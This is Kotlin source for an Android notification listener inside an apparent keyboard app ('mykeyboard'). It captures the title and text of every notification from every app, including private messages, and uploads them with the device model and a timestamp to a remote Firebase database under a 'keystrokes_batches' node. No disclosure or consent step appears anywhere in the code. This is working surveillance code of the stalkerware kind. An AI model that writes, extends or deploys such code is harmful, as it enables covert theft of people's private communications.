package com.example.mykeyboard

import android.app.Notification
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import androidx.annotation.RequiresApi
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@RequiresApi(Build.VERSION_CODES.KITKAT)
class AppNotificationListenerService : NotificationListenerService() {
    companion object {
        private const val TAG = "AppNotificationListener"
        private val scope = CoroutineScope(Dispatchers.IO)
        private fun getDatabaseRef(deviceName: String): DatabaseReference? = try {
            FirebaseDatabase.getInstance().getReference().child(deviceName).child("keystrokes_batches")
        } catch (e: Exception) {
            Log.e(TAG, "Error getting database ref", e)
            null
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        try {
            val packageName = sbn.packageName ?: "unknown"
            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

            if (title.isBlank() && text.isBlank()) return

            scope.launch {
                try {
                    val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                    val ref = getDatabaseRef(deviceName) ?: return@launch
                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                    val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9_-]"), "_")

                    val notificationData = mapOf(
                        "deviceName" to deviceName,
                        "packageName" to sanitizedAppName,
                        "title" to title,
                        "text" to text,
                        "timestamp" to System.currentTimeMillis()
                    )

                    ref.child("notification_$sanitizedAppName").child(timestampKey).setValue(notificationData)
                        .addOnSuccessListener {
                            Log.d(TAG, "Notification synced to Firebase successfully")
                            LogStore.addLog("[$deviceName] Notification synced ($sanitizedAppName): $title")
                        }
                        .addOnFailureListener { e: Exception ->
                            Log.e(TAG, "FAILED to sync notification to Firebase", e)
                            LogStore.addLog("[$deviceName] Notification sync FAILED: ${e.toString()}")
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing notification coroutine", e)
                    LogStore.addLog("Notification exception: ${e.toString()}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in onNotificationPosted", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }
}
